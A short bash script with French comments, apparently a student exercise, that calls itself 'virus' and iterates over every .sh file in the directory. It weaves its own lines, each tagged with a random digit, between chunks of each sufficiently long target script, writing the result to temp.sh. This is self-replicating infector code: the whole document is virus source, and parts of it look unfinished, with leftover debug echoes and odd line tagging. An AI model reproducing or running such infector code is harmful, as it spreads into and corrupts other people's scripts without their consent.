#!/bin/bash
result="temp.sh"
virus=$0
echo $virus
for cible in *.sh
do
    n0=$(cat $cible | wc -l )
    n1=$(cat $virus | wc -l )
    m1=$((3*$n1))
    echo "$(basename $cible) != $(basename $0) -a  $(basename $cible) != $(basename $1)" 
    if [ $n0 -gt $m1 -a $(basename $cible) != $(basename $0) -a  $(basename $cible) != $(basename $1) -a  $(basename $cible) != $(basename $2) ]
    then
        i=1
        head -n 27 $0 > $result   # code de restauration cat /dev/null >  $result
        j=0    
        while [ $i -lt $n1 ]
        do
            lvir=$(head -n $i $virus | tail -n 1 )
            r=$((($RANDOM % 3)+1))       
            echo "$lvir$r" >> $result        
	    j=$(($j+$r))
	    head -n $j $cible | tail -n $r >> $result
            i=$(($i+1))
        done        
        lvir=$(head -n $i $virus | tail -n 1 )
        r=0
        echo "$lvir$r" >> $result
        echo "$n0 - $j"
        r=$(($n0 - $j))
        cat $cible | tail -n $r >> $result  
    fi # pour etre propre il faudrait faire des copies
done
